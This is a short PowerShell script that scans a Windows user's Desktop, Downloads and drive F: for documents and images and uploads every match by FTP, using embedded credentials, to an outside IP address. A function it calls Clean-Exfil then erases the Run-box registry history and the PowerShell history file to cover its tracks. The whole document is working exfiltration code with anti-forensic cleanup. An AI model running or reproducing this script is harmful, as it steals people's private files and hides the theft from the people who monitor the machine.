$web=New-Object System.Net.WebClient
$Dir = "C:\Users\user\desktop","C:\Users\user\Downloads","F:\"
$FTP = "ftp://testadmin:testpassword@192.119.71.89/files/"
foreach($item in (Get-ChildItem $Dir -Include *.txt,*.xlsx,*.doc,*.xls*.pdf,*.pptx,*.docx,*.jpeg,*.jpg,*.png -Recurse)){
    $URI = New-Object System.Uri($FTP+$item.Name)
    $web.UploadFile($URI, $item.FullName)
}
#delete run box history
function Clean-Exfil{
	reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
	
	#delete powershell history
	Remove-Item (Get-PSreadlineOption).HistorySavePath
}
Clean-Exfil
